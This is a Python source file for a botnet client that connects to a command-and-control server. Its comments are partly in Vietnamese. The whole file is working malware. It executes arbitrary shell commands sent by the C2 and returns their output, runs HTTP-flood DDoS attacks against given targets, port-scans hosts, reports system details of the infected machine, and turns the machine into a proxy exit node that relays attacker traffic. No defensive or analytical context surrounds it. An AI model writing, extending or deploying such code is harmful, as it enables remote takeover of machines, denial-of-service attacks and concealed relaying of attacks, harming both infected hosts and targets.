#!/usr/bin/env python3
import argparse
import socket
import sys
import time
import threading
import uuid
import platform
import json
import ssl
from datetime import datetime
from collections import deque

# Global variables for proxy functionality
proxy_mode = False
proxy_connections = {}
health_stats = {
    'health_score': 100,
    'response_times': deque(maxlen=100),
    'total_requests': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'bytes_transferred': 0
}

def recv_loop(sock: socket.socket, bot_id: str):
    buf = b""
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                print("[-] Disconnected by server")
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                line = line.decode(errors="ignore").strip()
                if not line:
                    continue
                print(f"[C2] {line}")
                
                # Handle different commands
                if line.upper() == "PING":
                    try:
                        sock.sendall(b"PONG\n")
                    except Exception:
                        pass
                elif line == "ENABLE_PROXY_MODE":
                    enable_proxy_mode(sock, bot_id)
                elif line.startswith("PROXY_REQUEST:"):
                    handle_proxy_request(sock, line, bot_id)
                elif line.startswith("HEALTH_CHECK:"):
                    send_health_report(sock, bot_id)
                else:
                    # Handle other commands (DDoS, SCAN, etc.)
                    handle_other_command(sock, line, bot_id)
                    
        except Exception as e:
            print(f"[-] recv error: {e}")
            break

def enable_proxy_mode(sock: socket.socket, bot_id: str):
    """Enable proxy mode for this bot"""
    global proxy_mode
    proxy_mode = True
    print(f"[PROXY] Bot {bot_id} enabled as proxy exit node")
    try:
        sock.sendall(b"PROXY_MODE_ENABLED\n")
    except Exception:
        pass

def handle_proxy_request(sock: socket.socket, command: str, bot_id: str):
    """Handle proxy request from C2"""
    try:
        # Parse command: PROXY_REQUEST:connection_id:target_host:target_port:is_https
        parts = command.split(":")
        if len(parts) >= 5:
            connection_id = parts[1]
            target_host = parts[2]
            target_port = int(parts[3])
            is_https = parts[4].lower() == "true"
            
            print(f"[PROXY] Handling request to {target_host}:{target_port} (HTTPS: {is_https})")
            
            # Start proxy connection in separate thread
            proxy_thread = threading.Thread(
                target=proxy_connection_worker,
                args=(sock, connection_id, target_host, target_port, is_https, bot_id),
                daemon=True
            )
            proxy_thread.start()
            
    except Exception as e:
        print(f"[-] Error handling proxy request: {e}")
        try:
            sock.sendall(f"PROXY_ERROR:INVALID_REQUEST:{str(e)}\n".encode())
        except:
            pass

def proxy_connection_worker(sock: socket.socket, connection_id: str, target_host: str, 
                          target_port: int, is_https: bool, bot_id: str):
    """Worker thread to handle proxy connection"""
    target_socket = None
    start_time = time.time()
    
    try:
        # Create connection to target
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.settimeout(10)
        target_socket.connect((target_host, target_port))
        
        # If HTTPS, wrap with SSL
        if is_https:
            try:
                context = ssl.create_default_context()
                target_socket = context.wrap_socket(target_socket, server_hostname=target_host)
            except Exception as e:
                print(f"[-] SSL wrap error: {e}")
                raise
        
        # Send success response to C2
        success_msg = f"PROXY_CONNECTED:{connection_id}\n"
        sock.sendall(success_msg.encode())
        
        # Start data forwarding
        forward_data(sock, target_socket, connection_id, bot_id)
        
    except Exception as e:
        print(f"[-] Proxy connection error: {e}")
        try:
            error_msg = f"PROXY_ERROR:{connection_id}:{str(e)}\n"
            sock.sendall(error_msg.encode())
        except:
            pass
        health_stats['failed_requests'] += 1
    finally:
        if target_socket:
            try:
                target_socket.close()
            except:
                pass
        
        # Update health stats
        response_time = time.time() - start_time
        health_stats['response_times'].append(response_time)
        health_stats['total_requests'] += 1

def forward_data(sock: socket.socket, target_socket: socket.socket, 
                connection_id: str, bot_id: str):
    """Forward data between C2 and target"""
    def forward_to_target():
        """Forward data from C2 to target"""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                target_socket.sendall(data)
                health_stats['bytes_transferred'] += len(data)
        except Exception as e:
            print(f"[-] Forward to target error: {e}")
    
    def forward_to_c2():
        """Forward data from target to C2"""
        try:
            while True:
                data = target_socket.recv(4096)
                if not data:
                    break
                
                # Send response with connection ID
                response_msg = f"PROXY_RESPONSE:{connection_id}\n"
                sock.sendall(response_msg.encode())
                sock.sendall(data)
                health_stats['bytes_transferred'] += len(data)
                
        except Exception as e:
            print(f"[-] Forward to C2 error: {e}")
    
    # Start forwarding threads
    to_target_thread = threading.Thread(target=forward_to_target, daemon=True)
    to_c2_thread = threading.Thread(target=forward_to_c2, daemon=True)
    
    to_target_thread.start()
    to_c2_thread.start()
    
    # Wait for either thread to finish
    while to_target_thread.is_alive() and to_c2_thread.is_alive():
        time.sleep(0.1)
    
    # Update success stats
    health_stats['successful_requests'] += 1

def send_health_report(sock: socket.socket, bot_id: str):
    """Send health report to C2"""
    try:
        # Calculate average response time
        avg_response_time = 0
        if health_stats['response_times']:
            avg_response_time = sum(health_stats['response_times']) / len(health_stats['response_times'])
        
        # Calculate health score
        success_rate = 0
        if health_stats['total_requests'] > 0:
            success_rate = (health_stats['successful_requests'] / health_stats['total_requests']) * 100
        
        health_score = min(100, success_rate - (avg_response_time * 10))
        health_score = max(0, health_score)
        
        health_report = {
            'health_score': health_score,
            'response_time': avg_response_time,
            'total_requests': health_stats['total_requests'],
            'successful_requests': health_stats['successful_requests'],
            'failed_requests': health_stats['failed_requests'],
            'bytes_transferred': health_stats['bytes_transferred'],
            'proxy_mode': proxy_mode,
            'active_connections': len(proxy_connections)
        }
        
        report_msg = f"HEALTH_REPORT:{json.dumps(health_report)}\n"
        sock.sendall(report_msg.encode())
        
    except Exception as e:
        print(f"[-] Error sending health report: {e}")

def handle_other_command(sock: socket.socket, command: str, bot_id: str):
    """Handle other commands (DDoS, SCAN, etc.)"""
    try:
        if command.startswith("DDoS:"):
            handle_ddos_command(sock, command, bot_id)
        elif command.startswith("SCAN:"):
            handle_scan_command(sock, command, bot_id)
        elif command == "INFO":
            send_system_info(sock, bot_id)
        else:
            # Execute shell command
            execute_shell_command(sock, command, bot_id)
    except Exception as e:
        print(f"[-] Error handling command: {e}")

def handle_ddos_command(sock: socket.socket, command: str, bot_id: str):
    """Handle DDoS command"""
    try:
        # Parse: DDoS:TYPE:TARGET:DURATION
        parts = command.split(":")
        if len(parts) >= 4:
            attack_type = parts[1]
            target = parts[2]
            duration = int(parts[3])
            
            print(f"[DDoS] {attack_type} attack on {target} for {duration}s")
            
            # Start DDoS in separate thread
            ddos_thread = threading.Thread(
                target=execute_ddos_attack,
                args=(attack_type, target, duration, sock, bot_id),
                daemon=True
            )
            ddos_thread.start()
            
    except Exception as e:
        print(f"[-] DDoS command error: {e}")

def execute_ddos_attack(attack_type: str, target: str, duration: int, 
                       sock: socket.socket, bot_id: str):
    """Execute DDoS attack"""
    try:
        start_time = time.time()
        request_count = 0
        
        if attack_type == "HTTP_FLOOD":
            while time.time() - start_time < duration:
                try:
                    # Simple HTTP request
                    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target_socket.settimeout(1)
                    target_socket.connect((target, 80))
                    target_socket.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                    target_socket.close()
                    request_count += 1
                except:
                    pass
                    
        # Send completion report
        completion_msg = f"DDoS_COMPLETE:{attack_type}:{request_count}:{duration}\n"
        sock.sendall(completion_msg.encode())
        
    except Exception as e:
        print(f"[-] DDoS execution error: {e}")

def handle_scan_command(sock: socket.socket, command: str, bot_id: str):
    """Handle scan command"""
    try:
        # Parse: SCAN:TYPE:TARGET
        parts = command.split(":")
        if len(parts) >= 3:
            scan_type = parts[1]
            target = parts[2]
            
            print(f"[SCAN] {scan_type} scan on {target}")
            
            if scan_type == "PORTS":
                result = port_scan(target)
            elif scan_type == "SERVICES":
                result = service_scan(target)
            else:
                result = "Unknown scan type"
                
            scan_result = f"SCAN_RESULT:{scan_type}:{target}:{result}\n"
            sock.sendall(scan_result.encode())
            
    except Exception as e:
        print(f"[-] Scan command error: {e}")

def port_scan(target: str):
    """Simple port scan"""
    try:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 27017]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            except:
                pass
                
        return f"Open ports: {open_ports}"
        
    except Exception as e:
        return f"Scan error: {e}"

def service_scan(target: str):
    """Simple service scan"""
    try:
        services = {
            22: "SSH",
            80: "HTTP", 
            443: "HTTPS",
            3306: "MySQL",
            5432: "PostgreSQL"
        }
        
        detected_services = []
        for port, service in services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    detected_services.append(f"{service}({port})")
            except:
                pass
                
        return f"Services: {detected_services}"
        
    except Exception as e:
        return f"Service scan error: {e}"

def send_system_info(sock: socket.socket, bot_id: str):
    """Send system information"""
    try:
        import os
        import psutil
        
        info = {
            "bot_id": bot_id,
            "hostname": platform.node(),
            "system": platform.system(),
            "release": platform.release(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "cpu_count": os.cpu_count(),
            "memory": psutil.virtual_memory().total if 'psutil' in sys.modules else "N/A",
            "disk": psutil.disk_usage('/').total if 'psutil' in sys.modules else "N/A",
            "current_time": datetime.now().isoformat(),
            "proxy_mode": proxy_mode
        }
        
        info_msg = f"SYSTEM_INFO:{json.dumps(info)}\n"
        sock.sendall(info_msg.encode())
        
    except Exception as e:
        print(f"[-] Error sending system info: {e}")

def execute_shell_command(sock: socket.socket, command: str, bot_id: str):
    """Execute shell command"""
    try:
        import subprocess
        
        result = subprocess.run(command, shell=True, capture_output=True, 
                              text=True, timeout=30)
        
        output = f"STDOUT:{result.stdout}\nSTDERR:{result.stderr}\nRETURN_CODE:{result.returncode}"
        cmd_result = f"CMD_RESULT:{output}\n"
        sock.sendall(cmd_result.encode())
        
    except Exception as e:
        error_msg = f"CMD_ERROR:{str(e)}\n"
        sock.sendall(error_msg.encode())

def heartbeat_loop(sock: socket.socket, bot_id: str, interval: int = 30):
    while True:
        try:
            hb = f"HEARTBEAT:{bot_id}:{int(time.time())}\n".encode()
            sock.sendall(hb)
        except Exception as e:
            print(f"[-] heartbeat error: {e}")
            break
        time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="Minimal Bot Agent - connect to C2")
    parser.add_argument("--c2-host", required=True, help="C2 server IP or hostname")
    parser.add_argument("--c2-port", type=int, default=7777, help="C2 bots port (default: 7777)")
    parser.add_argument("--reconnect", type=int, default=5, help="Reconnect delay seconds (default: 5)")
    args = parser.parse_args()

    bot_id = f"bot_{uuid.uuid4().hex[:8]}"
    ident = f"{platform.system()}-{platform.release()}-{platform.machine()}"

    while True:
        try:
            print(f"[+] Connecting to {args.c2_host}:{args.c2_port} ...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((args.c2_host, args.c2_port))
            sock.settimeout(None)
            print("[+] Connected")

            # Gửi thông tin nhận diện (line-based)
            hello = f"BOT_CONNECT:{bot_id}:{ident}:{int(time.time())}\n".encode()
            try:
                sock.sendall(hello)
            except Exception:
                pass

            # Luồng nhận dữ liệu từ C2
            t_recv = threading.Thread(target=recv_loop, args=(sock, bot_id), daemon=True)
            t_recv.start()

            # Luồng heartbeat giữ kết nối
            t_hb = threading.Thread(target=heartbeat_loop, args=(sock, bot_id, 30), daemon=True)
            t_hb.start()

            # Giữ tiến trình chính chạy cho tới khi recv loop dừng
            while t_recv.is_alive():
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            sys.exit(0)
        except Exception as e:
            print(f"[-] connect error: {e}")

        print(f"[~] Reconnecting in {args.reconnect}s ...")
        time.sleep(args.reconnect)

if __name__ == "__main__":
    main()
